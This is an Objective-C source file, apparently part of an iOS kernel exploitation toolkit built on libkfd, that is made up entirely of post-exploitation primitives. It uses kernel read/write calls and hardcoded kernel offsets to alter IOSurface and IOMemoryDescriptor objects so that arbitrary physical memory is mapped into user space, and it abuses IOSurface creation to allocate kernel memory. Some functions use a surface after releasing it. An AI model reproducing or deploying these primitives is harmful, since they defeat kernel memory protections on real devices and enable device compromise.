#import <Foundation/Foundation.h>
#include <mach/arm/vm_param.h>
#import <IOSurface/IOSurfaceRef.h>
#import <IOKit/IOKitLib.h>
#import <CoreGraphics/CoreGraphics.h>
#include <os/log.h>
#include "IOSurface_Primitives.h"
#include "libkfd.h"
#include <IOKit/IOKitLib.h>
#import "DriverKit.h"
io_connect_t rootuserclientconnection = MACH_PORT_NULL;
struct _IOSurfaceFastCreateArgs {
    uint64_t address;
    uint32_t width;
    uint32_t height;
    uint32_t pixel_format;
    uint32_t bytes_per_element;
    uint32_t bytes_per_row;
    uint32_t alloc_size;
};

struct IOSurfaceLockResult {
    uint8_t _pad1[0x18];
    uint32_t surface_id;
    uint8_t _pad2[0xdd0-0x18-0x4];
};

struct IOSurfaceValueArgs {
    uint32_t surface_id;
    uint32_t field_4;
    union {
        uint32_t xml[0];
        char string[0];
    };
};

struct IOSurfaceValueResultArgs {
    uint32_t field_0;
};
uint64_t IOSurfaceRootUserClient_get_surfaceClientById(uint64_t rootUserClient, uint32_t surfaceId)
{
    uint64_t surfaceClientsArray = kread64_ptr_kfd(rootUserClient + 0x118);
    return kread64_ptr_kfd(surfaceClientsArray + (sizeof(uint64_t)*surfaceId));
}

uint64_t IOSurfaceClient_get_surface(uint64_t surfaceClient)
{
    return kread64_ptr_kfd(surfaceClient + 0x40);
}

uint64_t IOSurfaceSendRight_get_surface(uint64_t surfaceSendRight)
{
    return kread64_ptr_kfd(surfaceSendRight + 0x18);
}

uint64_t IOSurface_get_ranges(uint64_t surface)
{
    return kread64_ptr_kfd(surface + 0x3e0);
}

void IOSurface_set_ranges(uint64_t surface, uint64_t ranges)
{
    kwrite64_kfd(surface + 0x3e0, ranges);
}

uint64_t IOSurface_get_memoryDescriptor(uint64_t surface)
{
    return kread64_ptr_kfd(surface + 0x38);
}

uint64_t IOMemoryDescriptor_get_ranges(uint64_t memoryDescriptor)
{
    return kread64_ptr_kfd(memoryDescriptor + 0x60);
}

uint64_t IOMemorydescriptor_get_size(uint64_t memoryDescriptor)
{
    return kread64_kfd(memoryDescriptor + 0x50);
}

void IOMemoryDescriptor_set_size(uint64_t memoryDescriptor, uint64_t size)
{
    kwrite64_kfd(memoryDescriptor + 0x50, size);
}

void IOMemoryDescriptor_set_wired(uint64_t memoryDescriptor, bool wired)
{
    kwrite8_kfd(memoryDescriptor + 0x88, wired);
}

uint32_t IOMemoryDescriptor_get_flags(uint64_t memoryDescriptor)
{
    return kread32_kfd(memoryDescriptor + 0x20);
}

void IOMemoryDescriptor_set_flags(uint64_t memoryDescriptor, uint32_t flags)
{
    kwrite8_kfd(memoryDescriptor + 0x20, flags);
}

void IOMemoryDescriptor_set_memRef(uint64_t memoryDescriptor, uint64_t memRef)
{
    kwrite64_kfd(memoryDescriptor + 0x28, memRef);
}

uint64_t IOSurface_get_rangeCount(uint64_t surface)
{
    return kread64_ptr_kfd(surface + 0x3e8);
}

void IOSurface_set_rangeCount(uint64_t surface, uint32_t rangeCount)
{
    kwrite32_kfd(surface + 0x3e8, rangeCount);
}

// Releases an IOSurfaceRef properly by decrementing its use count and releasing its Core Foundation reference.
void IOSurface_release_surface(IOSurfaceRef surfaceRef) {
    // Ensure the surfaceRef is valid
    if (surfaceRef) {
        // Decrement the use count of the IOSurface
        IOSurfaceDecrementUseCount(surfaceRef);
        
        // Release the Core Foundation reference of the IOSurface
        CFRelease(surfaceRef);
    }
}

mach_port_t IOSurface_map_getSurfacePort(uint64_t magic) {
    IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        (__bridge NSString *)kIOSurfaceWidth : @120,
        (__bridge NSString *)kIOSurfaceHeight : @120,
        (__bridge NSString *)kIOSurfaceBytesPerElement : @4,
    });
    mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);

    IOSurface_release_surface(surfaceRef);
    
    *((uint64_t *)IOSurfaceGetBaseAddress(surfaceRef)) = magic;
    return port;
}

mach_port_t IOSurface_map_forhandoff(uint64_t phys, uint64_t size) {
    mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337);

    uint64_t surfaceSendRight = ipc_entry_lookup(surfaceMachPort);
    uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
    uint64_t desc = IOSurface_get_memoryDescriptor(surface);
    uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);

    kwrite64_kfd(ranges, phys);
    kwrite64_kfd(ranges + 8, size);

    IOMemoryDescriptor_set_size(desc, size);

    kwrite64_kfd(desc + 0x70, 0);
    kwrite64_kfd(desc + 0x18, 0);
    kwrite64_kfd(desc + 0x90, 0);

    IOMemoryDescriptor_set_wired(desc, true);

    uint32_t flags = IOMemoryDescriptor_get_flags(desc);
    IOMemoryDescriptor_set_flags(desc, (flags & ~0x410) | 0x20);

    IOMemoryDescriptor_set_memRef(desc, 0);

    return surfaceMachPort;
}

void *IOSurface_map(uint64_t phys, uint64_t size) {
    mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337);

    uint64_t surfaceSendRight = ipc_entry_lookup(surfaceMachPort);
    uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
    uint64_t desc = IOSurface_get_memoryDescriptor(surface);
    uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);

    kwrite64_kfd(ranges, phys);
    kwrite64_kfd(ranges + 8, size);

    IOMemoryDescriptor_set_size(desc, size);

    kwrite64_kfd(desc + 0x70, 0);
    kwrite64_kfd(desc + 0x18, 0);
    kwrite64_kfd(desc + 0x90, 0);

    IOMemoryDescriptor_set_wired(desc, true);

    uint32_t flags = IOMemoryDescriptor_get_flags(desc);
    IOMemoryDescriptor_set_flags(desc, (flags & ~0x410) | 0x20);

    IOMemoryDescriptor_set_memRef(desc, 0);

    IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);

    IOSurface_release_surface(mappedSurfaceRef);
    
    return IOSurfaceGetBaseAddress(mappedSurfaceRef);
}

static uint32_t
base255_encode(uint32_t value) {
    uint32_t encoded = 0;
    for (unsigned i = 0; i < sizeof(value); i++) {
        encoded |= ((value % 255) + 1) << (8 * i);
        value /= 255;
    }
    return encoded;
}
uint32_t
IOSurface_property_key(uint32_t property_index) {
    assert(property_index <= 0x00fd02fe);
    uint32_t encoded = base255_encode(property_index);
    assert((encoded >> 24) == 0x01);
    return encoded & ~0xff000000;
}
static mach_port_t IOSurface_kalloc_getSurfacePort(uint64_t size)
{
    IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        @"IOSurfaceAllocSize" : @(size),
        @"IOSurfaceAddress" : @((uint64_t)malloc(size)),
    });
    mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
    IOSurfaceDecrementUseCount(surfaceRef);
    return port;
}
 uint64_t kalloc(uint64_t size)
{
     bool leak = false;
     while (true) {
             mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort(size);
         uint64_t va = (uint64_t)ipc_entry_lookup(surfaceMachPort);
             if (va == 0) continue;

             return va;
         }

         return 0;
 }

